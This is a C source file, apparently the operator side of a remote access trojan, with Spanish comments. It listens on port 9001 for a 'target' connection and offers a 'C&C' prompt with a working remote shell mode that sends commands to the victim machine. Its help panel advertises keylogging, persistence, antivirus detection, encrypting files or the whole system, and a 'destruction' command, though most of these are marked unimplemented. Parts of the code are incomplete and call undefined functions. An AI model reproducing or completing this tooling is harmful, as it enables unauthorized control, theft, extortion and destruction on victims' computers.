#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <netinet/in.h>  
#include <sys/socket.h>  
#include <unistd.h>
#include <arpa/inet.h>

// Definiciones
#define SOCKBUFFER 2048

//Colores
const char *GREEN = "\033[0;32m\033[1m";
const char *end = "\033[0m\033[0m";
const char *RED = "\033[0;31m\033[1m";
const char *BLUE = "\033[0;34m\033[1m";
const char *YELLOW = "\033[0;33m\033[1m";
const char *PURLPLE = "\033[0;35m\033[1m";
const char *CYAN = "\033[0;36m\033[1m";
const char *GRAY = "\033[0;37m\033[1m";

// Prototipo
int startServer();
int shell(int targetConn, char *clientIP, uint16_t clientPort);
int sndAndExecCmd(int targetConn, char *command, char *resp);
int downloadFunc(char *command);
void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
void ctrlCHandler(int sig);
void helpPannel();

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printf("\n\n\t%s[!] %sSaliendo: Ctrl + C detectado... %s\n", RED, YELLOW, end);
    exit(1);
}

void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u ", clientIP, clientPort);
    printColor("\n\t[*>] ", YELLOW); printColor("Closing Connection to", RED); printf(" ===> "); printColor(formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    closesocket(targetConn);
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t| [!>] search <extension> (N/A) -> Search for files with named extension\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] downloadDir <path> (N/A) -> Download A full dir\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] download <path> (N/A) -> Download A File From Target PC\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] startTask (N/A)       -> Monitoring & kill tasks managers\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] check (N/A)           -> Check For Administrator Privileges\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] sysinfo (N/A)         -> Get System Information\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] av (N/A)              -> Try Detect Anti-Virus\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] upload <path> (N/A)   -> Upload local File To Target PC\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] get <url> (N/A)       -> Download A File To Target PC From Any Website\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] persistence (N/A)     -> Try to get persistence (needed root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] lowpersistence (N/A)  -> Try to get persistence (no root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] exec <command> (N/A)  -> Exec command in no shell mode\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] cryptDir <dir> (N/A)  -> Crypt a full folder in target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] crypt <file> (N/A)    -> Crypt a file in target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] keylog_dump (N/A)     -> Dump The Keystrokes From Keylogger\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] screenshot (N/A)      -> Take a screenshot\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] scannet (N/A)         -> Scan all active hosts on target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] scanhost <host> (N/A) -> Scan ports on host\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] hosts (N/A)           -> See hosts scanned with scannet\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] cryptAll (N/A)        -> Close connex and crypt full system\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] destruction (N/A)     -> Eliminate ALL and close conex\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

int sndAndExecCmd(int targetConn, char *command, char *resp){
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else if (strstr(resp, "Error") != NULL){
            // Comando de error
            printf("\n\t%s[*>]%s Error executing command... %s\n", RED, BLUE, end);
            break;
        
        } else {
            printf("%s", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    return 0;
}

int shell(int targetConn, char *clientIP, uint16_t clientPort){
    char command[255] = "";
    char resp[SOCKBUFFER];
    while (true) {
        
        printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 

            printf("\n\t%s[*>] %sExiting Shell mode\n\n%s", YELLOW, BLUE, end);
            send(targetConn, command, sizeof(command), 0);
            break;

        } else if (strlen(command) == 0){
            continue;
            //send(targetConn, ":", sizeof(command), 0); 
        } else{
            sndAndExecCmd(targetConn, command, resp);
        }
    }    
    return 0;

}

int downloadFunc(char *command){
    //Variables necesarias
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);

    printf("\n\t%s[*>] %sDownloading file %s %s %s\n\n", YELLOW, BLUE, YELLOW, file, end);

    // lógica para descargar archivos

    free(file); 
    return 0;


}

int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
    char command[255] = "";
    char resp[SOCKBUFFER];

    while (true){
        printf("%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
            
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else {
            if (strstr(command, "download") != NULL){
                downloadFunc(command);
                continue;
            
            } else if (strcmp(command, "shell") == 0){
                printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
                send(targetConn, "shell", strlen("shell"), 0);
                shell(targetConn, clientIP, clientPort);
            }
        }
    }
}

int startServer(){

    // Creamos el socket del cliente
    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9001);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    int targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[INET_ADDRSTRLEN];  // String para almacenar la dirección IP
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    // Obtenemos el puerto del cliente
    uint16_t clientPort = ntohs(clientAddr.sin_port);

    printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);

    mainFunction(targetConn, clientIP, clientPort);
    

}

int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    startServer();
    return 0;

}
